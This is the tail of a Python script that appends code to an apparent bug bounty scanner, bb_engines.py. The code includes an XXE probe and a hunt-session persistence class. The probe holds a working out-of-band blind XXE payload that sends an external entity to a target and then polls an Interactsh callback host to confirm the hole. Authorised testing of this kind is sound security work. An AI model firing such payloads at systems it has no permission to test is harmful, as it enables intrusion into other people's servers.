        # OOB blind XXE
        if oob and oob.get("ok"):
            callback = oob["callback_url"]
            oob_payload = f\'\'\'<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "{callback}/xxe">
  %xxe;
]>
<root/>\'\'\'.format(callback=callback)

            for ct in content_types[:1]:
                try:
                    _post(url, data=oob_payload.encode(), headers={"Content-Type": ct}, timeout=8)
                    import time as _t
                    _t.sleep(5)
                    poll = _get(
                        f"{oob[\'server\']}/poll?id={oob[\'correlation_id\']}&secret={oob[\'correlation_id\']}",
                        timeout=8,
                    )
                    if poll and poll.status_code == 200:
                        data = poll.json() if poll.text else {}
                        interactions = data.get("data") or data.get("interactions") or []
                        if interactions:
                            findings.append({
                                "type": "xxe_oob_blind",
                                "severity": "CRITICAL",
                                "url": url,
                                "message": "Blind XXE confirmed via OOB Interactsh callback!",
                                "callback": callback,
                                "interactions": interactions[:3],
                                "confirmed": True,
                            })
                except Exception:
                    pass

        # Deduplicate
        seen = set()
        unique = []
        for f in findings:
            key = (f["type"], f.get("indicator", ""))
            if key not in seen:
                seen.add(key)
                unique.append(f)

        return unique

    def format_report(self, findings: List[Dict]) -> str:
        if not findings:
            return "  ✅ No XXE indicators found (tested classical + OOB techniques)"

        lines = [f"💉 XXE Injection Results — {len(findings)} finding(s)", "═" * 55]
        for f in findings:
            sev = f.get("severity", "MEDIUM")
            icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡"}.get(sev, "•")
            lines.append(f"  {icon} [{sev}] {f[\'message\']}")
            if f.get("indicator"):
                lines.append(f"       Indicator  : \'{f[\'indicator\']}\'")
            if f.get("content_type"):
                lines.append(f"       Content-Type: {f[\'content_type\']}")
            if f.get("callback"):
                lines.append(f"       OOB Callback: {f[\'callback\']}")
        lines.append("  ➜ Submit this immediately — XXE is typically HIGH/CRITICAL bounty")
        return "\\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# 17. HUNT SESSION  (persistence across runs)
# ══════════════════════════════════════════════════════════════════════════════

class HuntSession:
    """
    Persist the full state of an active bug bounty hunt across runs.
    Stores: scope, findings, discovered subdomains, scan timestamps,
            session metadata (program, platform, start date).

    Files saved to: hunt_sessions/<domain>.json
    """

    SESSIONS_DIR = "hunt_sessions"

    def __init__(self, domain: str = ""):
        self.domain = domain
        self.scope: List[str] = []
        self.findings: List[Dict] = []
        self.subdomains: List[str] = []
        self.scanned_urls: List[str] = []
        self.metadata: Dict = {}
        self._path = ""
        os.makedirs(self.SESSIONS_DIR, exist_ok=True)
        if domain:
            self._path = os.path.join(self.SESSIONS_DIR, f"{domain.replace(\'.\', \'_\')}.json")

    def save(self) -> str:
        """Save current hunt state to disk."""
        if not self._path:
            return "  ❌ No domain set — call HuntSession(domain)"
        state = {
            "domain": self.domain,
            "scope": self.scope,
            "findings": self.findings,
            "subdomains": self.subdomains,
            "scanned_urls": self.scanned_urls,
            "metadata": {
                **self.metadata,
                "last_updated": datetime.now().isoformat(),
            },
        }
        with open(self._path, "w", encoding="utf-8") as f:
            json.dump(state, f, indent=2)
        return f"  ✅ Hunt session saved: {self._path}"

    def load(self, domain: str = "") -> bool:
        """Load a saved hunt session."""
        domain = domain or self.domain
        if not domain:
            return False
        path = os.path.join(self.SESSIONS_DIR, f"{domain.replace(\'.\', \'_\')}.json")
        if not os.path.exists(path):
            return False
        try:
            with open(path, "r", encoding="utf-8") as f:
                state = json.load(f)
            self.domain = state.get("domain", domain)
            self.scope = state.get("scope", [])
            self.findings = state.get("findings", [])
            self.subdomains = state.get("subdomains", [])
            self.scanned_urls = state.get("scanned_urls", [])
            self.metadata = state.get("metadata", {})
            self._path = path
            return True
        except Exception:
            return False

    def status(self) -> str:
        """Return a summary of the current hunt session."""
        lines = [
            f"🏹 Hunt Session: {self.domain or \'(none)\'}",
            "─" * 55,
            f"  Scope      : {len(self.scope)} domain(s)",
            f"  Subdomains : {len(self.subdomains)} discovered",
            f"  Findings   : {len(self.findings)} logged",
            f"  Scanned    : {len(self.scanned_urls)} URL(s)",
        ]
        if self.metadata.get("last_updated"):
            lines.append(f"  Last Update: {self.metadata[\'last_updated\'][:16]}")
        if self._path:
            lines.append(f"  Save Path  : {self._path}")
        return "\\n".join(lines)

    @classmethod
    def list_sessions(cls) -> str:
        """List all saved hunt sessions."""
        sessions_dir = cls.SESSIONS_DIR
        if not os.path.exists(sessions_dir):
            return "  ℹ️  No hunt sessions directory found."
        files = [f for f in os.listdir(sessions_dir) if f.endswith(".json")]
        if not files:
            return "  ℹ️  No saved hunt sessions yet."
        lines = [f"📂 Saved Hunt Sessions ({len(files)}):"]
        for f in sorted(files):
            path = os.path.join(sessions_dir, f)
            try:
                with open(path) as fh:
                    state = json.load(fh)
                domain = state.get("domain", f.replace("_", ".")[:-5])
                updated = state.get("metadata", {}).get("last_updated", "?")[:10]
                n_findings = len(state.get("findings", []))
                lines.append(f"  • {domain:<30} {n_findings} finding(s) | Updated: {updated}")
            except Exception:
                lines.append(f"  • {f} (unreadable)")
        lines.append(f"\\n  ➜ Load: /bugbounty session load <domain>")
        return "\\n".join(lines)
'''

with open("bb_engines.py", "a", encoding="utf-8") as f:
    f.write(NEW_ENGINES_CODE)

print("✅ New engines appended to bb_engines.py successfully!")
print(f"   Added: DOMXSSEngine, WebSocketEngine, RequestSmugglingEngine")
print(f"   Added: XXEProbeEngine, HuntSession")
print(f"   Enhanced: AuthSessionEngine (test_login_bypass, test_mass_assignment)")
print(f"   Enhanced: JWTScanner (test_forged_against_server)")
print(f"   Enhanced: CVSS31Calculator (suggest_vector)")
print(f"   Enhanced: ShodanEngine (EPSS scores)")
